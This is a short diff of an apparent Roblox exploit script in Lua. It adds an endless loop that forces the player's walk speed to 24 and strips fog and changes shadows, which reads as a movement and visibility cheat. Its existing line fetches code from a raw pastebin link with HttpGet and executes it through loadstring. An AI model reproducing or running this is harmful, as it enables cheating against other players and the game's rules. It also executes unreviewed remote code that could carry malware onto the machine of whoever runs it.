@@ -1,3 +1,10 @@
+while true do
+game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 24
+game.Lighting.GlobalShadows = true
+game.Lighting.FogEnd = 9999999
+wait()
+end
+
 loadstring(game:HttpGet("https://pastebin.com/raw/w5S7M4dm"))();
 
 --- Tut
